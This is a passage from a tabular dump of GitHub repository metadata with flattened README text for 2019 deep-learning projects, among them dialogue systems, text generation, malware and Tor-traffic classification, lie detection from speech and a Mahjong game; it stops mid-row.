uber-research,FSDM,deep-learning#deep-neural-networks#dialogue-agents#dialogue-systems#natural-language-generation#natural-language-processing#natural-language-understanding,Flexibly Structured Model for Task Oriented Dialogues This repository contains the code of the SIGDIAL 2019 paper Lei Shu Piero Molino Mahdi Namazifar Hu Xu Bing Liu Huaixiu Zheng Gokhan Tur Flexibly Structured Model for Task Oriented Dialogues https arxiv org abs 1908 02402 Here are the slides https leishu02 github io FSDMSIGDIAL2019 pdf FSDM FSDM a novel end to end architecture for task oriented dialogue systems It is based on a simple and practical yet very effective sequence to sequence approach where language understanding and state tracking tasks are modeled jointly with a structured copy augmented sequential decoder and a multi label decoder for each slot The policy engine and language generation tasks are modeled jointly following that The copy augmented sequential decoder deals with new or unknown values in the conversation while the multi label decoder combined with the sequential decoder ensures the explicit assignment of values to slots On the generation part slot binary classifiers that predict if a slot will appear in the answer are used to improve performance This architecture is scalable to real world scenarios and is shown through an empirical evaluation to achieve state of the art performance on both the Cambridge Restaurant dataset and the Stanford in car assistant dataset Instructions Please download GloVe embedding glove 6B 50d txt from GloVe website https nlp stanford edu projects glove and place them under data glove Dataset The CamRest676 https www repository cam ac uk handle 1810 260970 and Stanford KVRET in car assistant https nlp stanford edu blog a new multi turn multi domain task oriented dialogue dataset datasets are provided in a preprocessed JSON format for convenience but they belong to the original authors Please download and place them under data CamRest676 and data kvret respectively Model training For camrest dataset python model py mode train data camrest For kvret dataset python model py mode train data kvret Model testing For camrest dataset python model py mode test data camrest For kvret dataset python model py mode test data kvret Model finetuning For camrest dataset python model py mode adjust data camrest For kvret dataset python model py mode adjust data kvret Hyperparameter configuration In order to configure hypermeters change the values in config py or use the cfg argument python model py mode adjust data camrest cfg epochnum 50 beamsearch True Citing If you use the code please cite inproceedingsshu etal 2019 flexibly title Flexibly Structured Model for Task Oriented Dialogues author Shu Lei and Molino Piero and Namazifar Mahdi and Xu Hu and Liu Bing and Zheng Huaixiu and Tur Gokhan booktitle Proceedings of the 20th Annual SIGdial Meeting on Discourse and Dialogue month sep year 2019 address Stockholm Sweden publisher Association for Computational Linguistics url https www aclweb org anthology W19 5922 pages 178 187,2019-07-11T20:14:41Z,2019-12-09T03:35:18Z,Python,uber-research,Organization,1,3,1,29,master,leishu02#w4nderlust,2,0,0,0,0,0,0
YIZHE12,foodnet,n/a,cuisine A text classifier Predict cuisine based on ingredients Background You ve just joined the data team at an online publishing company One of your verticals is a food publication A product manager on your team wants to build a feature for this vertical that enables users to query by cuisine not just by ingredients Most of your recipes are unlabeled and it s infeasible to label them by hand Luckily you have a small training set of about 10 000 recipes with labeled cuisines Design and execute a method to predict the cuisine of a recipe given only its ingredients Data Due Diligence All Purpose Flour and Flour are likely the same ingredient but red onions and yellow onions are incredibly different For each major cuisine what are the driving ingredients that characterize it What are the features of a cuisine that drive misclassification in your method above How could you design this to be robust enough to understand similarities substitutions between ingredients Your product manager indicates a likelihood that you will only need to write a guideline for an outsourced team to hand label the remaining corpus How would you go about writing this guide for a few major cuisines Solutions First look of the data Imbalanced dataset can anticipate that the classifier will work better in the majority class Use tSNE and word2vec to visualize the ingredients vs cuisines I first converted the ingredients in text data to vector data using word2vec I then use tSNE to reduce the dimensions of the vector space to 2D Finally I color the data with the most likely cuisine in which the ingredients appear most often We can see the five majority classes have clear clustering My next task is to generate an instruction for hand labelling for a few major cuisine As the top 5 cuisine always have clear clustering in our tSNE I chose a shallow tree model to generate the hand labelling for only these 5 cuisine I limited the number of leaves and the depth of the tree so that the result of the tree classifier can be used for hand labelling I then used a random forest classifier to classify all cuisine to see if I can find an AI solution to replace hand labelling The result is as shown below One thing I noticed that is although there are almost equal amount of common ingredients between brazillian and italian and brazillian and chinese it is quite likely to classify brazillian as italian but not chinese Therefore it is the combination of ingredients that matters I decided to use bidirectional RNN model which shows a great improvement from the random forest Finally I used data augmentation of the text data to increase the number of examples of the minority classes As the order of the ingredients doesn t matter we can shuffle the ingredient text data around to generate new training examples By doing that finally I improve further the results For example british improved from 0 28 to 0 56 filipino improved form 0 36 to 0 58 Try the code The code for this data chanllenge is in the notebook folder Github doesn t always load well for large ipynb file therefore I also converted the ipynb file to mb file in the folder,2019-07-05T14:50:34Z,2019-08-22T14:36:49Z,Jupyter Notebook,YIZHE12,User,0,3,0,5,master,YIZHE12,1,0,0,0,0,0,0
imdeepmind,GeneratingTextWithLSTM,deep-learning#keras#lstm-model#machine-learning#python#recurrent-neural-networks#text-generation,Generating Text with LSTM Recurrent Neural Networks The aim of this project is to generate text using LSTM Recurrent Neural Networks LSTM Recurrent Neural Networks are powerful Deep Learning models that are used for learning sequenced data Here an LSTM model is trained on 200 million samples and the idea is that after training on 200 million samples it should be able to generate text Note Due to limited computational power I haven t trained the model on those 200 million samples Instead I just trained it on 30 million samples Table of contents Introduction introduction Dataset dataset Model model Sample Results sample results Dependencies dependencies File Structure file structure Future Improvements future improvements Acknowledgments acknowledgments Introduction Recurrent Neural Networks are great in learning sequenced data With enough data and computational power they can learn very complex things In this project LSTM Recurrent Neural Networks are used to generating text To do that the model is trained on the dataset of text characters The dataset contains 40 character long sequences and the next character after the sequence The model is here predicting the next character based on the 40 characters long sequence Dataset For this project I m using the Amazon Review Dataset https s3 amazonaws com amazon reviews pds readme html Amazon Review Dataset is a gigantic collection of product reviews It contains more than 130 millions of reviews In this project I have used a small fraction of the original dataset Downloading instructions and other information about the dataset can be found on the dataset website After that the dataset is preprocessed so that it can be used here in this project During preprocessing first the dataset is cleaned and then divided into sequences After that the preprocessed dataset contains a sequence of characters and the next character Here the model is trained to predict the next character based on the sequence of characters To know more about the preprocessing step please check this GitHub repositiry https github com imdeepmind AmazonReview LanguageGenerationDataset Also to download the dataset please click here https www kaggle com imdeepmind language generation dataset 200m samples Model Generating text is not an easy task for a computer it is one of the hardest problem for computers Here in this project to solve this problem different types of Networks were used The first layer in the model is a Embedding https keras io layers embeddings layer In Keras an Embedding layer is a work embedding layer word2vec or glove This layer is used to generate a vector representation of each sequence in our training sample The send layer is an LSTM layer LSTM of Long Short Term Memory Recurrent Neural Network is a type of Neural Network that is used for sequenced data Here is a link https colah github io posts 2015 08 Understanding LSTMs to a great blog on LSTM If you want to learn more about LSTM please read it The third layer is a Dense layer with ReLu activation method In Keras Dense is a normal densely connected Neural Network And then we have a Dropout layer just to prevent overfitting Finally the output Softmax layer for predicting the outputs Sample Results Here are some the text that the model generated after training Generated text with temperature 0 2 i purchase these for a friend in return is a little better than the strings and i was able to be a little particularly the sound is a standard of the bass and i recommend this product and the stand is a great sound on the stand and a bit of the bass stand and the light strings are not the price i was able to be a bit for a strings and the stand is the company is a great buy and the stand is a bit of the stand and the box is a little too hard to see and the box and the stand is a good sound that i was able to stay in the price i ha Generated text with temperature 0 5 i purchase these for a friend in return is a great guitar it is expecting one of them at some price is comfortable to set out to have a good guitar and the digital time i have not to the weeknet with the neck and the sound is good and is one of them i have been hard to get the strings and works great i am sure i just build a drive enter of what the work and the white is not a bit use the sound is that it is really disappointed in the last sound remote to be a professional cart product and when i have a sound parts and i have a s Generated text with temperature 1 0 i purchase these for a friend in return is not and not knob i was simply confused to their working to spend a loop synthetice is nice well as i noticed i can say on which harp of the appreciated no willanh mics just decided to learn this time and enjoying when you punch around my transport decent motect and liked another sounding i give a price of my case it point about a variously shipping tuned delay it is too recording extension inseption for construction of amazon instructions and only is glad this will not come alth Generated text with temperature 1 2 i purchase these for a friend in return without using them i received it ones brightering the brand because at home on the plastic with amazon changeband but set on a problem shortes like for gigny from my daughter kind listed guitar to make the taste in some fitting opened slight varuier ultheetile sensitivity the at so better mild the colors are extremely good or lud and after my d 65 monow justice shops it orning the pair of swinging me not did work very bad no room there is a clamp nemhing tape over up wash was expen Dependencies The project is developed using Python 3 6 Further some other libraries are also used Below is a list of the libraries used in this project Keras 2 2 4 Numpy 1 16 2 Pandas 0 24 2 Sqlite3 2 6 0 File Structure Following are the files in the project callback py This class is used for generating some samples results after each epoch constants py This file contains all the constants for the project generator py This file contains a generator that is used to read the data in a batch model py This file contains the main model for the project predict py This is a simple script for predicting some text using the trained model Future Improvements Currently the model is trained only on 30 million samples not 200 million samples due to technical limitation If the model is trained on 200 million samples then the model can perform better Acknowledgments Amazon Review Dataset https s3 amazonaws com amazon reviews pds readme html Text Generation With LSTM Recurrent Neural Networks in Python with Keras blog by machinelearningmastery com https machinelearningmastery com text generation lstm recurrent neural networks python keras Keras code example of LSTM for text generation by keras team https github com fchollet keras blob master examples lstmtextgeneration py,2019-08-06T14:52:04Z,2019-09-15T18:33:52Z,Python,imdeepmind,User,0,3,0,58,master,imdeepmind,1,0,0,0,0,0,0
tanxuehan,Image-Composition-of-Partially-Occluded-Objects,n/a,,2019-06-25T07:18:15Z,2019-07-01T10:15:19Z,C++,tanxuehan,User,0,3,1,1,master,tanxuehan,1,0,0,0,0,0,0
LeadingIndiaAI,Classifying-Different-Crop-Categories-Using-Hyperspectral,n/a,About Dataset trained on xtrain pickle ycat pickle tested on xval pickle yval pickle xtrain was generated using hyperspectral images xtrain contains 1500 samples Each sample is made using 7 hyperspectral images xval contains 93 samples ytrain contains 1500 samples Each sample in ytrain has 41 channels Number of classes in our dataset yval contains 93 samples,2019-07-31T04:52:05Z,2019-11-23T12:56:40Z,Python,LeadingIndiaAI,User,2,3,2,2,master,66Ankit,1,0,0,0,0,0,0
aldavies,machine-and-deep-learning,n/a,These are the machine learning workshops associated with Full Stack Coding this is also a great readme,2019-07-12T03:32:43Z,2019-11-26T12:21:43Z,Jupyter Notebook,aldavies,User,1,2,3,4,master,aldavies,1,0,0,0,0,0,0
andreiliphd,snake,n/a,Snake deep learning with GUI This application is written in tkinter and allows to do image classification tasks CUDA is required to use an application Features Support choosing a directory for your image classification task You can choose batch size learning rate and number of epochs Setup Clone this repo git clone https github com andreiliphd snake git Install all the dependencies Usage Please provide a folder with images License You can check out the full license in the LICENSE file This project is licensed under the terms of the MIT license,2019-07-02T15:47:29Z,2019-07-04T13:08:47Z,Python,andreiliphd,User,0,2,3,4,master,andreiliphd,1,0,0,0,0,0,0
jayurbain,DeepNLPIntro2019,n/a,DeepNLPIntro2019 Hands on introduction to natural language processing NLP and deep learning for NLP Review NLP fundamentals with Spacy word representations with Gensim deep learning architectures and applications with PyTorch and introduce current state of the art models and methods for transfer learning Topic Outline 0 Introduction to Deep Learning and the Workshop slides 1DeepLearningIntroduction pdf 1 Introduction to NLP slides 2DeepNLPIntro pdf Deep Learning Concepts NLP NLP vocabulary why NLP is hard NLP core tasks and applications Instructions for running labs Notebook Introduction to NLP using Spacy notebooks spaCy spaCy Intro ipynb Tokenization POS Named entity recognition Sentiment classification 2 Word Representations and Embeddings slides 3WordRepresentations pdf Embeddings and self supervised pre training word2vec GLoVe fasttext Notebook Word Representations notebooks embeddings wordvectorvisualization ipynb Embeddings Note You can skip the t SNE cells at the bottom very slow 3 PyTorch for Deep NLP slides PyTorch NLP pdf PyTorch intro Training networks NLP on PyTorch RNNs Sequence models Encoder decoder Transfer learning Notebook Text Classification with BOW notebooks pyTorch 1textclassificationbow ipynb Notebook Text Classification with RNN notebooks pyTorch 3rnntextclassification ipynb Notebook Character language model with RNN notebooks pyTorch 4charactertextgeneration ipynb optional Notebook seq2seq with Attention RNN notebooks pyTorch 5seq2seqattentiontranslation ipynb Notebook Fine Tuning with GPT notebooks pyTorch 6gpt2finetunedtextgeneration ipynb Notebook Embeddings with Context notebooks pyTorch 2embeddings ipynb Optional PyTorch Baiscs Notebook PyTorch Basics notebooks pyTorch PyTorchBasics ipynb Tensors tensor operations Notebook PyTorch Machine Learning notebooks pyTorch pytorchtutorialdeeplearning ipynb Gradients linear regression logisitc regression neural network Google Collab https colab research google com,2019-07-23T10:28:18Z,2019-10-28T19:46:23Z,Jupyter Notebook,jayurbain,User,0,2,2,5,master,jayurbain,1,0,0,0,0,0,0
cyberhunters,Malware-Detection-Using-Machine-Learning,15#asm#assembly-codes#big#big-2015#big15#byte-file#bytecode#jupiter-notebook#kaggle-competition#machine-learning#malware-analysis#malware-detection#microsoft-big-2015#pytorch,Malware Detection Using Machine Learning This repository contains the source code for detecting different type of malwares using Deep learning based Feature Extraction and Wraper based Feature Selection Technique A research paper describing how it works is availible at to be updated Two major approaches we used for malware classification 1 Image representation of byte file Independent of the platform It requires No knowledge of domain like assembly instructions 2 Hybrid feature space using both ASM and byte file This approach is platform dependent but gives a better performance that using byte file Requires huge resources and processing time The data used in these tutorial can be found on the Hybrid Final folder of following drive link https drive google com drive folders 1s7EC4s hP9q5vEhs 3vAubspcZbBADK usp sharing After downloading the required dataset following is the sequence of files in the hybrid folder whose execution will lead to results 1 Creating hybrid dataset 2 Min max normalization hybrid dataset 3 ANN Results The project was done under the guidance of Dr Asifullah Khan DCIS PIEAS,2019-07-20T12:25:22Z,2019-12-06T07:17:16Z,Jupyter Notebook,cyberhunters,User,0,2,2,29,master,cyberhunters,1,0,0,0,0,0,0
ndexter,DLforCompMath,n/a,PIMS CRG Summer School Deep Learning for Computational Mathematics Welcome to the GitHub repository for the summer 2019 school on Deep Learning for Computational Mathematics http www pims math ca scientific event 190722 pcssdlcm In this repository you will find all of the necessary files for the Monday Tuesday and Wednesday tutorials that accompany this summer school The purpose of this summer school is to introduce students in applied and computational mathematics to neural networks and deep learning It will feature three days of lectures and hands on tutorials and be followed by a one day workshop showcasing current research directions and applications in particular those relating to computational science and engineering Lectures will cover the foundational mathematics of deep learning and the tutorials will expose students to their practical implementation in standard software TensorFlow on a variety of tasks including image classification function approximation and restoration superresolution This workshop is aimed at students in applied mathematics or related areas It assumes no prior knowledge of neural networks Experience in calculus linear algebra and analysis and numerical analysis are essential To check out this repository into your home directory on https hdda2019 syzygy ca jupyter https hdda2019 syzygy ca jupyter please click the following link https hdda2019 syzygy ca jupyter user redirect git pull repo https github com ndexter DLforCompMath SCHEDULE Monday Tutorial 1 Introduction to Neural Networks with tensorflow Monday s tutorial will focus on basics of using the jupyter hub interface commands exposed to the user through magic keywords python and software packages for data science and conclude with a simple model of function approximation using Google s tensorflow software package 10 00 am 11 00 am Lecture Introduction to Neural Networks 11 00 am 11 30 am Coffee break 11 30 am 12 30 pm Lecture Introduction to Neural Networks continued 12 30 pm 01 30 pm Lunch break 01 30 pm 03 00 pm Tutorial Introduction to Neural Networks with tensorflow 03 00 pm 03 30 pm Coffee break 03 30 pm 05 00 pm Tutorial Introduction to Neural Networks with tensorflow continued Slides from Lecture 1 https www dropbox com s mzobrtp513q18ps Lecture 201 pdf dl 0 Tuesday Tutorial 2 Data driven Modelling with tensorflow Part I Tuesday s tutorial will provide hands on experience with some of the more complicated aspects of deep learning as featured in the lectures The goal of today s session is to reinforce some of the concepts and related challenges covered in today s lectures through several examples of applying deep learning for tasks in data science 10 00 am 11 00 am Lecture From Neural Networks to Deep Learning 11 00 am 11 30 am Coffee break 11 30 am 12 30 pm Lecture From Neural Networks to Deep Learning continued 12 30 pm 01 30 pm Lunch break 01 30 pm 03 00 pm Tutorial Data driven Modelling with tensorflow Part I 03 00 pm 03 30 pm Coffee break 03 30 pm 05 00 pm Tutorial Data driven Modelling with tensorflow Part I continued Slides from Lecture 2 https www dropbox com s ptsppsd8cckbagb Lecture 202 pdf dl 0 Wednesday Tutorial 3 Data driven Modelling with tensorflow Part II Wednesday s tutorials will continue with the theme of Tuesdays covering some of the more interesting aspects of approximation with deep neural networks issues with convergence and methods of regularization 10 00 am 11 00 am Lecture Approximation Theory for Neural Networks 11 00 am 11 30 am Coffee break 11 30 am 12 30 pm Lecture Approximation Theory for Neural Networks continued 12 30 pm 01 30 pm Lunch break 01 30 pm 03 00 pm Tutorial Data driven Modelling with tensorflow Part II 03 00 pm 03 30 pm Coffee break 03 30 pm 05 00 pm Tutorial Data driven Modelling with tensorflow Part II continued Slides from Lecture 3 https www dropbox com s e6jisvlrl33xd4v Lecture 203 pdf dl 0 Thursday July 25 Mini workshop Deep Learning Confrimed Speakers Talk 1 Max Libbrecht SFU Understanding human gene regulation using deep neural networks Talk 2 Paul Tupper SFU Which Learning Algorithms Can Generalize Identity Effects to Novel Inputs Talk 3 Aaron Berk UBC A deep learning approach to retinal fundus imaging Talk 4 Ben Adcock SFU Instabilities in deep learning 09 30 am 10 15 am Talk 1 10 15 am 10 45 am Coffee break 10 45 am 11 30 am Talk 2 11 30 am 01 45 pm Lunch break 01 45 pm 02 30 pm Talk 4 02 30 pm 03 15 pm Talk 5,2019-07-22T02:15:17Z,2019-09-23T23:38:34Z,Jupyter Notebook,ndexter,User,0,2,9,6,master,ndexter,1,0,0,0,0,0,0
seungpyo,deep_home_security,n/a,Deep Home Security myidwithme png https user images githubusercontent com 7239579 59995464 2912cb80 9692 11e9 98cf 127f936a259a png As you can see facerecognition even recognizes me wearing a hat and me in the Korean ID card What is this system for This system puts face recognition and IP camera together thus enabling the surveilence of your place Personally I ve wondered what happens in my room when I go out and that was the direct motivation of this project Installation First you need Python 3 to run this system I strongly recommend you to make a virtual environment for this system To install the dependencies just run pip install r requirements txt For now there are a number of hard coded values in codes To run the system you should In watch py and takepics py fix vsrc value Details are explained in Ip Camera section In watch py fix encodings seungpyo encodings to the path where you store your face encodings It is highly recommended to store the encodings in encodings directory IP Camera I used dahua s IP camera and its model name is DH SD29204T GN Although dahua provides a number of cool features like PTZ control or face detection through its web based controller I just read frames from the camera using OpenCV s VideoCapture If you want to reproduce my results using your own IP camera you should be careful about the issues below You should fix the vsrc the video source URI by putting your ID and password If you are just using a webcam on your laptop or a USB webcam just set vsrc to 0 I put camera upside down to put it on my table and used cv2 flip If you installed it upright you should remove the cv2 flip Dahua IP Camera has a default IP address of 192 168 1 108 Beware of subnet mask settings so that your PC can access IP camera Face Recognition I used Python s facerecognition library This library provides face recognition encoding comparision and so on takepics py By running python takepics py you can register your face to the system Although the system compares every photos you registered the latency doesn t change even though you increase the number of photos It seems like facerecognition library performs batch operation watch py This is the main program that actually watches your place For now there are a number of hardcoded values in this code so you should fix some of them grantedencodings You should modify the encoding file path To do Since I wrote the first version of this one in a rush there are too many hard coded values I am going to gather them to a single config py file so that user can manipulate them easily After this process I can write more detailed install guide here Currently only a single person s face can be registered as Granted I should make a generic version of this code so that users can register multiple faces e g family members friends,2019-06-24T05:32:05Z,2019-06-24T06:39:13Z,Python,seungpyo,User,1,2,2,8,master,seungpyo,1,0,0,2,0,1,0
tanhtm,DeepLearning,n/a,DeepLearning,2019-08-02T07:22:32Z,2019-08-10T07:30:51Z,Jupyter Notebook,tanhtm,User,3,2,0,9,master,tanhtm,1,0,0,0,0,0,0
HalidFiliz,DeepLearningChangeDetection,n/a,,2019-07-31T12:35:09Z,2019-11-30T01:12:01Z,Python,HalidFiliz,User,2,2,2,13,master,mhtefe#HalidFiliz,2,0,0,0,0,0,0
Minzhe,DeepLearning_LTV,n/a,,2019-07-25T16:57:50Z,2019-12-10T12:50:56Z,Python,Minzhe,User,0,2,0,6,master,Minzhe,1,0,0,0,0,0,0
rambasnet,DeepLearning-TorTraffic,n/a,DeepLearning Tor Traffic Detecting and Classifying Tor Traffic using Deep Learning Techniques Dataset Downloaded from https www unb ca cic datasets tor html Data Cleanup dropped samples with Infinitiy values dropped samples witn NaN values dropped Source IP and Destination IP columns features Datasets Summary Scenario A Labeled TOR and nonTOR dataset build model to classify encrypted TOR traffic from non TOR traffic File Name Tor Non Tor Total merged5s csv 14507 69680 84187 Scenario B contains only the TOR encrypted dataset build model to classify various types of TOR traffic File Name FILE TRANSFER BROWSING VIDEO AUDIO VOIP CHAT P2P MAIL Total merged5s csv 1663 2644 1529 1026 4524 485 2139 497 14507 Deep Learning Frameworks perfomance results using various deep learning frameworks are compared Fastai Pytorch https www fast ai uses PyTorch phttps pytorch org as the backend Keras https keras io using Tensorflow and Theano as backend https www tensorflow org https github com Theano Theano Results Scenario A Dataset Framework Accuracy merged5s csv Fastai Pytorch 99 96 Keras Tensorflow Keras Theano Scenario B Dataset Framework Accuracy merged5s csv Fastai Pytorch 99 72 Keras Tensorflow Keras Theano References Arash Habibi Lashkari Gerard Draper Gil Mohammad Saiful Islam Mamun and Ali A Ghorbani Characterization of Tor Traffic Using Time Based Features In the proceeding of the 3rd International Conference on Information System Security and Privacy SCITEPRESS Porto Portugal 2017,2019-06-26T16:18:36Z,2019-06-28T17:40:12Z,Jupyter Notebook,rambasnet,User,0,2,0,3,master,rambasnet,1,0,0,1,0,0,0
ang3loliveira,defcon27_ai_village,n/a,,2019-08-04T14:28:36Z,2019-08-23T06:53:12Z,Jupyter Notebook,ang3loliveira,User,1,2,2,9,master,ang3loliveira,1,0,0,0,0,0,0
castorgit,DAL_Workshop,n/a,DALWorkshop Notebooks and Files Deep Learning Workshop at DAL Files are used as examples and come from different sources They are examples for the workshop Notebook Description 01KerasMNISTMLP ipynb Multilayer perceptron on MNIST dataset Deep Learning Hello World 02KerasQMNISTMLP ipynb Same as 01 but used instead of MNIST the whole new QMNIST dataset 120 000 Good for playing with Accuracy Some learnings from the new dataset 03KerasexampleIRISmulticlass ipynb Example of classification using IRIS dataset Multiclass classification,2019-07-22T14:13:09Z,2019-08-16T01:41:34Z,Jupyter Notebook,castorgit,User,0,2,2,35,master,castorgit,1,0,0,0,0,0,0
mburakergenc,Cancer-Detection-w-DeepLearning,n/a,,2019-08-02T19:31:08Z,2019-08-18T13:48:03Z,Jupyter Notebook,mburakergenc,User,2,2,0,3,master,mburakergenc,1,0,0,0,0,0,0
blueberryc,Deep-Learning,n/a,Deep Learning PDF Typora markdown Machine Learning https github com blueberryc Machine Learning 1 Chapter01 Chapter01 md PDF https github com blueberryc Deep Learning raw master Chapter01 E7 BA BF E6 80 A7 E4 BB A3 E6 95 B0 Chapter01 E7 BA BF E6 80 A7 E4 BB A3 E6 95 B0 pdf 2,2019-07-30T08:10:19Z,2019-08-14T12:08:03Z,n/a,blueberryc,User,0,2,1,6,master,blueberryc,1,0,0,0,0,0,0
rishabhusc,MachineLearning---Deep-learning-Python,n/a,,2019-06-30T07:54:17Z,2019-09-14T08:01:12Z,Jupyter Notebook,rishabhusc,User,0,2,0,5,master,rishabhusc,1,0,0,0,0,0,0
Rajnish20,Deep-Learning,n/a,Deep Learning CNN for image classification Above Deep learning model is for image classification of two categories with the accuracy of 99 on training set and 75 on the test set and if you want to increase the accuracy of test set you can just add one more layer of convolution to the CNN model and the model s accuracy will increase to 80 The predict method will be updated soon,2019-06-27T17:50:30Z,2019-09-03T05:42:11Z,Jupyter Notebook,Rajnish20,User,0,2,0,6,master,Rajnish20,1,0,0,0,0,0,0
CamerAI,Deep-Learning-,n/a,Deep Learning What Is Deep Learning Deep learning is a machine learning technique that teaches computers to do what comes naturally to humans learn by example Deep learning is a key technology behind driverless cars enabling them to recognize a stop sign or to distinguish a pedestrian from a lamppost It is the key to voice control in consumer devices like phones tablets TVs and hands free speakers Deep learning is getting lots of attention lately and for good reason Its achieving results that were not possible before In deep learning a computer model learns to perform classification tasks directly from images text or sound Deep learning models can achieve state of the art accuracy sometimes exceeding human level performance Models are trained by using a large set of labeled data and neural network architectures that contain many layers How does deep learning attain such impressive results In a word accuracy Deep learning achieves recognition accuracy at higher levels than ever before This helps consumer electronics meet user expectations and it is crucial for safety critical applications like driverless cars Recent advances in deep learning have improved to the point where deep learning outperforms humans in some tasks like classifying objects in images While deep learning was first theorized in the 1980s there are two main reasons it has only recently become useful Deep learning requires large amounts of labeled data For example driverless car development requires millions of images and thousands of hours of video Deep learning requires substantial computing power High performance GPUs have a parallel architecture that is efficient for deep learning When combined with clusters or cloud computing this enables development teams to reduce training time for a deep learning network from weeks to hours or less Introducing Deep Learning with MATLAB Deep Learning with MATLAB ebook Examples of Deep Learning at Work Deep learning applications are used in industries from automated driving to medical devices Automated Driving Automotive researchers are using deep learning to automatically detect objects such as stop signs and traffic lights In addition deep learning is used to detect pedestrians which helps decrease accidents Aerospace and Defense Deep learning is used to identify objects from satellites that locate areas of interest and identify safe or unsafe zones for troops Medical Research Cancer researchers are using deep learning to automatically detect cancer cells Teams at UCLA built an advanced microscope that yields a high dimensional data set used to train a deep learning application to accurately identify cancer cells Industrial Automation Deep learning is helping to improve worker safety around heavy machinery by automatically detecting when people or objects are within an unsafe distance of machines Electronics Deep learning is being used in automated hearing and speech translation For example home assistance devices that respond to your voice and know your preferences are powered by deep learning applications Source Matlab,2019-07-25T19:52:21Z,2019-09-25T22:49:12Z,n/a,CamerAI,User,0,2,0,4,master,CamerAI,1,0,0,0,0,0,0
ivyclare,DeepCars---Transfer-Learning-With-Pytorch,n/a,DeepCars Transfer Learning With Pytorch Classification of different car brands,2019-07-26T18:06:00Z,2019-09-14T16:18:04Z,Jupyter Notebook,ivyclare,User,2,2,1,3,master,ivyclare,1,0,0,0,0,0,0
anti-antares,Deep_Learning_Project_4,n/a,DeepLearningProject4 11785 Project 4 Part 1 Language Model training ipynb HW4P1 ipynb 11785 Project 4 Part 2 Attention based End to End Speech to Text Deep Neural Network py Dataset WSJ voices Task Sentence to Transcript Model Listener Attention and Spell https arxiv org abs 1508 01211 Metric Levenshtein distances,2019-07-11T06:42:09Z,2019-08-10T02:19:26Z,Jupyter Notebook,anti-antares,User,0,2,1,4,master,anti-antares,1,0,0,0,0,0,0
Spandan-Madan,deep_learning_normalization,n/a,deeplearningnormalization A personal pet project to explore different kinds of normalizations in Deep Learning research Papers we ll be working with Batch Renormalization https arxiv org pdf 1702 03275 pdf Group Normalization https arxiv org pdf 1803 08494 pdf Batch Instance Norm https arxiv org pdf 1805 07925 pdf Layer Normalization https arxiv org pdf 1607 06450 pdf Instance Normalization https arxiv org pdf 1607 08022 pdf Kalman Normalization https papers nips cc paper 7288 kalman normalization normalizing internal representations across network layers pdf Batch Normalization If I missed something please suggest and I ll add them Goal Read all papers upload annotated versions for others to read Write a summary of all of them Code them up and compare on a task Classification,2019-06-28T21:47:02Z,2019-07-01T06:27:52Z,n/a,Spandan-Madan,User,0,2,1,2,master,Spandan-Madan,1,0,0,0,0,0,0
alicex2020,Deep-Learning-Lie-Detection,acoustic-features#deep-learning#ensemble-classifier#ensemble-learning#ensemble-machine-learning#ensemble-model#lie-detector#machine-learning#mfcc#mfcc-analysis#pitch-tracking#support-vector-machines,Deep Learning for Lie Detection Using machine learning models to detect lies based solely on acoustic speech information Current methods of lie detection are highly inaccurate and dependent on physiological and behavioral patterns Less research has focused on creating a computational model to automate lie detection Here I train several machine learning models and a sequential neural network using solely acoustic features in speech for lie detection Mel frequency cepstral coefficients MFCC energy envelopes and pitch contours are generated from a balanced dataset of deceptive and non deceptive speech recordings collected from a 2 person lying game Predictions on a single audio file were binary classified as either a truth or a lie The best model presented is a majority voting ensemble learning classifier constructed from a Gradient Boosting Classifier GBC Support Vector Machine SVM and Stochastic Gradient Descent SGD trained on MFCC and energy features The maximum accuracy for lie detection achieved using this model is 55 8 which outperforms the baseline chance accuracy of 50 and human accuracy of 48 These results achieve an incremental improvement on a task which has monumental applications ranging from criminal investigations to national security,2019-07-06T16:51:00Z,2019-08-17T03:34:44Z,Jupyter Notebook,alicex2020,User,0,2,0,5,master,alicex2020,1,0,0,1,0,0,0
newbiepawel,deep_learning_and_other,n/a,,2019-07-14T18:12:55Z,2019-09-29T19:20:15Z,Jupyter Notebook,newbiepawel,User,1,2,1,32,master,newbiepawel,1,0,0,0,0,0,1
seyedmohammadmortaji,deep_learning_trading,n/a,deeplearningtrading Using a rolling window which consists of a determined number of past prices as input for predicting next prices This repo has just the training and backtesting scripts and uses Oanda But you can use MT4 and ZMQ for other brockers as well,2019-07-17T12:16:53Z,2019-07-20T09:45:24Z,Python,seyedmohammadmortaji,User,0,2,0,3,master,seyedmohammadmortaji,1,0,0,0,0,0,0
piyush2896,Deep-Learning-With-Python,n/a,Deep Learning With Python These are my notes of Book Deep Lerning with Python by Franois Chollet Current Chapters 1 What Is Deep Learning ipynb https github com piyush2896 Deep Learning With Python blob master 1 What 20Is 20Deep 20Learning ipynb 2 Mathematical Building Blocks of Neural Networks ipynb https github com piyush2896 Deep Learning With Python blob master 2 Mathematical 20Building 20Blocks 20of 20Neural 20Networks ipynb Note Please support official book this repository is a gist and can t comprehend the details and length author goes in the book,2019-07-01T18:35:22Z,2019-09-23T07:28:04Z,Jupyter Notebook,piyush2896,User,0,2,0,14,master,piyush2896,1,0,0,0,0,0,0
shauryabit2k18,deep_learning_udacity,n/a,,2019-06-25T04:44:13Z,2019-11-27T16:37:16Z,Jupyter Notebook,shauryabit2k18,User,0,2,0,26,master,shauryabit2k18,1,0,0,0,0,0,0
lucylow,Deep-Learning-Mahjong---,battle-mahjong#computer-vision#deep-learning-mahjong#deep-neural-network#deep-q-network#game-development#game-play#game-theory#mahjong#markov-chain#markov-model#nlp#npc-generator#reactjs#reinforcement#reinforcement-learning#softmax#supervised-learning#supervised-machine-learning#tensorflow,Deep Learning Mahjong x1F534 Mahjong x1F534 Status https img shields io badge status work in progress success svg GitHub Issues https img shields io github issues lucylow Deep Learning Mahjong svg https github com lucylow Deep Learning Mahjong issues GitHub Pull Requests https img shields io github issues pr lucylow Deep Learning Mahjong svg https github com lucylow Deep Learning Mahjong pulls License https img shields io bower l bootstrap Game Play x1F53B 3 or 4 player draw and discard game with 144 tiles based on Chinese characters and symbols Match open pairs of identical tiles remove from board exposing the tiles under them for play Game ends when all pairs of tiles have been removed from the board or no more exposed pairs remaining Players get more realistic experiences and playable content in a game that involves skill strategy calculation and chance Types Make Configurable x1F534 Old Hong Kong Cantonese Mahjong DEFAULT MODE Competitive Mahjong International Standard Three Player Mahjong 3 ka Battle Mahjong Player vs Cartoon NPC Game Tile Count Per Set Total 144 x1F53B Simples 108 Dots 36 Bamboo 36 Characters 36 Honors 28 Winds North West South East 16 Dragons Red Green White 12 Bonus 8 Flower Plum Blossom Orchid Chrysanthemum 